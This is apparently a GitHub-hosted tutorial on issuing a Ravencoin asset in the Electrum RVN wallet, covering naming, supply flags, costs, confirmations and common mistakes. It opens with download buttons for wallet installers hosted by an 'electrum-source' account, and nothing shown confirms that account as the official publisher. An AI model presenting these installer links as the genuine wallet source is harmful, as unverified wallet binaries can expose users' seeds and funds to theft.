![Electrum RVN](assets/banner-article.png)

# How to Issue a Ravencoin Asset in Electrum RVN

<!-- compact-download-block -->

<p align="center">Claiming a name and setting supply in one step</p>

<p align="center"><a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F05239?style=for-the-badge&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="Download for macOS"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F05239?style=for-the-badge&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`electrum-rvn-v4.8.0-setup.exe`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-F05239?style=flat-square&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="macOS"> | macOS 12 or later | [`electrum-rvn-v4.8.0.dmg`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg) |
| <img src="https://img.shields.io/badge/Linux-F05239?style=flat-square&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-rvn-v4.8.0.AppImage`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage) |

</div>

All versions and checksums are on the [release page](https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0).

> [!WARNING]
> Only download from this GitHub release page.

<!-- /compact-download-block -->
Issuing an asset creates a native object on the Ravencoin chain: you choose a name and a quantity, pay a chain-level charge plus the network fee, and the asset appears in your wallet. It is not a token contract and not a wrapped coin - the name lives in the chain's own asset index, which is why this wallet can hold and send it.

## What you are actually creating

Ravencoin's asset layer is part of the protocol. When you issue, the chain records a name, a quantity, and the rules you chose - whether the asset can be reissued, whether it is restricted, whether units are divisible. The name is claimed on the chain at that moment and is not available to anyone else afterwards.

That is the single most important thing to understand before you start. An asset name is a scarce public identifier, and the issuance transaction is permanent.

| You choose | It decides |
| --- | --- |
| Name | the global identifier, taken forever |
| Quantity | the initial supply |
| Divisibility | whether fractions exist (units vs whole items) |
| Reissuable or not | whether supply can ever grow |
| Restricted or not | whether the issuer keeps an allow-list |
| Unique | whether it is a single indivisible item |

[What is a Ravencoin asset?](https://github.com/electrum-source/token-and-network/blob/main/what-is-a-ravencoin-asset-in-electrum-rvn.md) covers the object itself; this page is the procedure.

## Before you issue

**Fund the wallet with RVN.** Issuance costs RVN - a chain-level charge plus the transaction fee - and you need a balance left over to move the asset afterwards. Do not spend the wallet to zero issuing.

**Choose the name deliberately.** Names are first-come and global. A short common word may already be taken; a name tied to your project is worth checking before you commit, because there is no rename.

**Decide the rules once.** Reissuable versus fixed supply is not a setting you can revisit. If the asset is a certificate, fixed supply; if it is a token whose supply may grow, reissuable - and understand that a reissuable asset's holders are trusting you.

**Issue a test asset first.** One issuance you can afford to lose teaches you the flow, the confirmations and the wallet's asset display without risking the real name's economics.

## The procedure

1. **Open the assets section** of the wallet and choose to create a new asset.
2. **Enter the name**, exactly as you want it. Check the spelling twice: the chain records what you type.
3. **Enter the quantity** and choose divisibility.
4. **Set the flags**: reissuable, restricted, or unique. Each has consequences described above.
5. **Review the summary** - name, quantity, flags, and the cost shown in RVN - before confirming.
6. **Confirm and broadcast**, then wait for it to be mined.
7. **Wait for confirmations before expecting the asset to appear.** The site's troubleshooting is explicit that an issued asset needs confirmations, and that a server switch or rescan can be needed before the balance shows.

Step seven is where most "my asset is missing" reports come from. The issuance happened; the wallet's view has not caught up. [Issued asset missing from Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/issued-asset-missing-from-electrum-rvn.md) is the diagnosis if it does not appear after a reasonable wait.

## How long it takes, and what "cost" means

The issuance is a transaction like any other: it enters the mempool, gets mined into a block, and confirms from there. On Ravencoin's one-minute target that is quick, but quick is not instant, and a busy mempool applies to issuance as much as to a payment.

The cost is two things: a chain-level issuance charge, and the ordinary network fee for the transaction. The wallet shows what it will cost before you confirm - and that number is the authority, because it is read from the chain's rules rather than from a marketing page. [Ravencoin asset issuance cost in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/ravencoin-asset-issuance-cost-in-electrum-rvn.md) is about the charge itself.

## What you can do afterwards

A named asset can have sub-assets under it, be burned, be reissued if you allowed it, and be transferred to any address that understands native Ravencoin assets. Those are separate operations with their own pages:

- [creating Ravencoin sub-assets](https://github.com/electrum-source/token-and-network/blob/main/creating-ravencoin-sub-assets-in-electrum-rvn.md)
- unique assets, for the single-unit case
- [transferring Ravencoin assets](https://github.com/electrum-source/token-and-network/blob/main/transferring-ravencoin-assets-with-electrum-rvn.md)
- [burning and reissuing assets](https://github.com/electrum-source/token-and-network/blob/main/burning-and-reissuing-assets-with-electrum-rvn.md)

None of them can change the name.

## Common mistakes

**Issuing from a wallet you have not backed up.** The asset lives at an address derived from your seed; if the seed is lost, so is the asset. Write the seed down first - [backing up an Electrum RVN seed](https://github.com/electrum-source/passphrase-backup/blob/main/backing-up-an-electrum-rvn-seed.md).

**Sending the asset to a wallet that does not understand assets.** The transaction is valid, the recipient sees nothing, and they will report that you sent nothing. [Transferring Ravencoin assets with Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/transferring-ravencoin-assets-with-electrum-rvn.md).

**Issuing the real thing first.** Test with a name you do not care about.

**Forgetting that the name is permanent.** There is no delete, no rename and no refund.

The wallet is actively maintained, and the current release is on the releases page: https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0. Asset handling has been an active area of the wallet's development, so issuing on an older build is the one thing worth avoiding - [updating to the latest release](https://github.com/electrum-source/download-and-setup/blob/main/update-electrum-rvn-to-the-latest-release.md).

## FAQ

### What does it cost to issue an asset?

A chain-level issuance charge plus the network fee, both in RVN. The wallet shows the exact amount before you confirm, and that figure is the one to trust.

### Can I issue more than one asset?

Yes, each with its own name and its own charge. Names are global, so each is a separate claim.

### Can I rename an asset after issuing?

No. The name is fixed at issuance and permanent on the chain.

### Why is my new asset not showing?

Issuance needs confirmations, and the wallet may need a rescan or a server switch to see it. Check the transaction on an explorer before assuming it failed.

### Can I issue an asset with zero RVN in the wallet?

No. The charge and the fee are paid in RVN, and you need a balance afterwards to move the asset.

<!-- related-articles -->

## Related articles

- [What Is a Ravencoin Asset?](https://github.com/electrum-source/token-and-network/blob/main/what-is-a-ravencoin-asset-in-electrum-rvn.md)
- [Issued Asset Missing From Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/issued-asset-missing-from-electrum-rvn.md)
- [Ravencoin Asset Issuance Cost in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/ravencoin-asset-issuance-cost-in-electrum-rvn.md)
- [Creating Ravencoin Sub-Assets in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/creating-ravencoin-sub-assets-in-electrum-rvn.md)
